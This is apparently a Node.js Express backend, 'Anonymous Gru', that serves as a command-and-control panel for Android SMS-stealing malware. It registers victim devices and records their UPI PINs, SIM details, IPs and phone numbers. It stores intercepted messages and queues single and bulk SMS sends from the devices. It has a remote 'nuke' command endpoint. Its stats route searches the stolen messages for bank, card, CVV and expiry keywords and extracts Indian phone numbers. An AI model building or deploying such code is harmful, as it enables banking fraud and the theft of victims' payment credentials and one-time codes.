const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, 'data');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
const OUTBOX_FILE = path.join(DATA_DIR, 'outbox.json');
const NUKE_JOBS_FILE = path.join(DATA_DIR, 'nukeJobs.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Initialize JSON files
const initFile = (file, defaultData) => {
  if (!fs.existsSync(file)) {
    fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
  }
};
initFile(DEVICES_FILE, {});
initFile(MESSAGES_FILE, {});
initFile(OUTBOX_FILE, {});
initFile(NUKE_JOBS_FILE, {});

// Helpers
const readJSON = (file) => {
  try {
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch {
    return {};
  }
};
const writeJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// -------- STATIC FILES (optional) --------
// If you put your frontend files (index.html, static/css, etc.) in a 'public' folder,
// uncomment the line below to serve them.
// app.use(express.static(path.join(__dirname, 'public')));

// -------- ROOT ROUTE --------
app.get('/', (req, res) => {
  res.json({
    name: 'Anonymous Gru Backend API',
    version: '1.0.0',
    status: 'running',
    endpoints: {
      devices: '/api/devices',
      device: '/api/devices/:id',
      messages: '/api/messages/:deviceId',
      sendSms: '/api/sms/send',
      bulkSms: '/api/sms/bulk',
      outbox: '/api/sms/outbox/:deviceId',
      nuke: '/api/nuke',
      nukeStatus: '/api/nuke/status/:deviceId',
      stats: '/api/stats',
      health: '/api/health'
    }
  });
});

// -------- HEALTH CHECK --------
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now() });
});

// -------- DEVICE ENDPOINTS --------
app.get('/api/devices', (req, res) => {
  const devices = readJSON(DEVICES_FILE);
  res.json(devices);
});

app.get('/api/devices/:id', (req, res) => {
  const devices = readJSON(DEVICES_FILE);
  const device = devices[req.params.id];
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  res.json(device);
});

app.post('/api/devices', (req, res) => {
  const { id, name, status, battery, android, ip, storage, provider, cpu, sdk, sims, upipin, modelName, phoneNumber, lastSeen } = req.body;
  if (!id) {
    return res.status(400).json({ error: 'Device ID is required' });
  }

  const devices = readJSON(DEVICES_FILE);
  const existing = devices[id] || {};

  devices[id] = {
    ...existing,
    id,
    name: name || existing.name || id,
    status: status !== undefined ? status : (existing.status || false),
    battery: battery || existing.battery || '—',
    android: android || existing.android || '—',
    ip: ip || existing.ip || '—',
    storage: storage || existing.storage || '—',
    provider: provider || existing.provider || '—',
    cpu: cpu || existing.cpu || '—',
    sdk: sdk || existing.sdk || '—',
    sims: sims || existing.sims || [],
    upipin: upipin || existing.upipin || null,
    modelName: modelName || existing.modelName || name || id,
    phoneNumber: phoneNumber || existing.phoneNumber || '—',
    lastSeen: lastSeen || Date.now(),
    updatedAt: Date.now()
  };

  writeJSON(DEVICES_FILE, devices);
  res.json({ success: true, device: devices[id] });
});

app.delete('/api/devices/:id', (req, res) => {
  const devices = readJSON(DEVICES_FILE);
  if (!devices[req.params.id]) {
    return res.status(404).json({ error: 'Device not found' });
  }
  delete devices[req.params.id];
  writeJSON(DEVICES_FILE, devices);
  res.json({ success: true });
});

// -------- MESSAGES --------
app.get('/api/messages/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 150;
  const messages = readJSON(MESSAGES_FILE);
  const deviceMessages = messages[deviceId] || [];
  const sorted = deviceMessages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
  const latest = sorted.slice(-limit);
  res.json(latest);
});

app.post('/api/messages/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { sender, message, dateTime, type } = req.body;
  if (!message) {
    return res.status(400).json({ error: 'Message text is required' });
  }

  const messages = readJSON(MESSAGES_FILE);
  if (!messages[deviceId]) {
    messages[deviceId] = [];
  }

  const entry = {
    sender: sender || 'Unknown',
    message,
    dateTime: dateTime || new Date().toISOString(),
    timestamp: Date.now(),
    type: type || 'incoming'
  };

  messages[deviceId].push(entry);
  writeJSON(MESSAGES_FILE, messages);
  res.json({ success: true, entry });
});

// -------- SMS SEND --------
app.post('/api/sms/send', (req, res) => {
  const { deviceId, to, message, simSlot } = req.body;
  if (!deviceId || !to || !message) {
    return res.status(400).json({ error: 'deviceId, to, and message are required' });
  }

  const outbox = readJSON(OUTBOX_FILE);
  if (!outbox[deviceId]) {
    outbox[deviceId] = [];
  }

  const entry = {
    id: uuidv4(),
    to,
    message,
    simSlot: simSlot || '1',
    status: 'queued',
    timestamp: Date.now(),
    dateTime: new Date().toISOString()
  };

  outbox[deviceId].push(entry);
  writeJSON(OUTBOX_FILE, outbox);

  // Also store in messages as outgoing
  const messages = readJSON(MESSAGES_FILE);
  if (!messages[deviceId]) {
    messages[deviceId] = [];
  }
  messages[deviceId].push({
    sender: 'Device',
    message: `📤 To: ${to}\n${message}`,
    dateTime: entry.dateTime,
    timestamp: entry.timestamp,
    type: 'outgoing'
  });
  writeJSON(MESSAGES_FILE, messages);

  // Simulate delivery after 2s
  setTimeout(() => {
    const updated = readJSON(OUTBOX_FILE);
    if (updated[deviceId]) {
      const found = updated[deviceId].find(e => e.id === entry.id);
      if (found) {
        found.status = 'sent';
        writeJSON(OUTBOX_FILE, updated);
      }
    }
  }, 2000);

  res.json({ success: true, entry });
});

app.post('/api/sms/bulk', (req, res) => {
  const { deviceId, recipients, message, simSlot } = req.body;
  if (!deviceId || !recipients || !Array.isArray(recipients) || recipients.length === 0) {
    return res.status(400).json({ error: 'deviceId and recipients array required' });
  }
  if (!message) {
    return res.status(400).json({ error: 'message is required' });
  }

  const outbox = readJSON(OUTBOX_FILE);
  if (!outbox[deviceId]) {
    outbox[deviceId] = [];
  }

  const entries = recipients.map(to => ({
    id: uuidv4(),
    to,
    message,
    simSlot: simSlot || '1',
    status: 'queued',
    timestamp: Date.now(),
    dateTime: new Date().toISOString()
  }));

  outbox[deviceId].push(...entries);
  writeJSON(OUTBOX_FILE, outbox);

  // Add to messages
  const messages = readJSON(MESSAGES_FILE);
  if (!messages[deviceId]) {
    messages[deviceId] = [];
  }
  entries.forEach(entry => {
    messages[deviceId].push({
      sender: 'Device',
      message: `📤 Bulk to: ${entry.to}\n${entry.message}`,
      dateTime: entry.dateTime,
      timestamp: entry.timestamp,
      type: 'outgoing'
    });
  });
  writeJSON(MESSAGES_FILE, messages);

  // Simulate sending each after random delay
  entries.forEach((entry, index) => {
    setTimeout(() => {
      const updated = readJSON(OUTBOX_FILE);
      if (updated[deviceId]) {
        const found = updated[deviceId].find(e => e.id === entry.id);
        if (found) {
          found.status = 'sent';
          writeJSON(OUTBOX_FILE, updated);
        }
      }
    }, 1000 + index * 500);
  });

  res.json({ success: true, count: entries.length, entries });
});

app.get('/api/sms/outbox/:deviceId', (req, res) => {
  const outbox = readJSON(OUTBOX_FILE);
  const deviceOutbox = outbox[req.params.deviceId] || [];
  res.json(deviceOutbox.sort((a, b) => b.timestamp - a.timestamp));
});

// -------- NUKE --------
app.post('/api/nuke', (req, res) => {
  const { deviceId, command, data } = req.body;
  if (!deviceId) {
    return res.status(400).json({ error: 'deviceId is required' });
  }

  const nukeJobs = readJSON(NUKE_JOBS_FILE);
  const jobId = uuidv4();
  nukeJobs[deviceId] = {
    jobId,
    command: command || 'nuke',
    data: data || {},
    status: 'pending',
    requestedAt: Date.now(),
    completedAt: null
  };
  writeJSON(NUKE_JOBS_FILE, nukeJobs);

  // Simulate nuke execution
  setTimeout(() => {
    const jobs = readJSON(NUKE_JOBS_FILE);
    if (jobs[deviceId]) {
      jobs[deviceId].status = 'completed';
      jobs[deviceId].completedAt = Date.now();
      writeJSON(NUKE_JOBS_FILE, jobs);
    }
  }, 5000);

  res.json({ success: true, jobId });
});

app.get('/api/nuke/status/:deviceId', (req, res) => {
  const nukeJobs = readJSON(NUKE_JOBS_FILE);
  const job = nukeJobs[req.params.deviceId] || null;
  res.json(job);
});

// -------- STATS --------
app.get('/api/stats', (req, res) => {
  const devices = readJSON(DEVICES_FILE);
  const deviceList = Object.values(devices);
  const total = deviceList.length;
  const online = deviceList.filter(d => d.status === true).length;
  const offline = total - online;

  const messages = readJSON(MESSAGES_FILE);
  let bankCount = 0, cardCount = 0;
  const phoneNumbers = new Set(), networks = new Set();

  Object.keys(messages).forEach(deviceId => {
    const msgs = messages[deviceId] || [];
    msgs.forEach(msg => {
      const text = msg.message || '';
      if (/balance|avail|credited|debited|₹|INR/i.test(text)) bankCount++;
      if (/card|cvv|expiry|credit|debit/i.test(text)) cardCount++;
      const phoneMatch = text.match(/(?:\+91|0)?[6-9]\d{9}/);
      if (phoneMatch) phoneNumbers.add(phoneMatch[0]);
      const netMatch = text.match(/jio|airtel|bsnl|vodafone|idea|vi|docomo|reliance/i);
      if (netMatch) networks.add(netMatch[0]);
    });
  });

  res.json({
    total,
    online,
    offline,
    bankSmsCount: bankCount,
    cardSmsCount: cardCount,
    uniquePhoneNumbers: [...phoneNumbers],
    uniqueNetworks: [...networks]
  });
});

// -------- CATCH-ALL FOR UNKNOWN API ROUTES --------
app.use('/api/*', (req, res) => {
  res.status(404).json({ error: `API endpoint not found: ${req.originalUrl}` });
});

// -------- FALLBACK FOR NON-API ROUTES (optional) --------
// If you want to serve a frontend single-page app, uncomment below.
// app.get('*', (req, res) => {
//   res.sendFile(path.join(__dirname, 'public', 'index.html'));
// });

// For now, we just return a 404 for any non-API route (except root which is defined).
app.use((req, res) => {
  res.status(404).json({ error: 'Route not found' });
});

app.listen(PORT, () => {
  console.log(`✅ Anonymous Gru backend running on port ${PORT}`);
  console.log(`📍 Visit http://localhost:${PORT} for API info`);
});
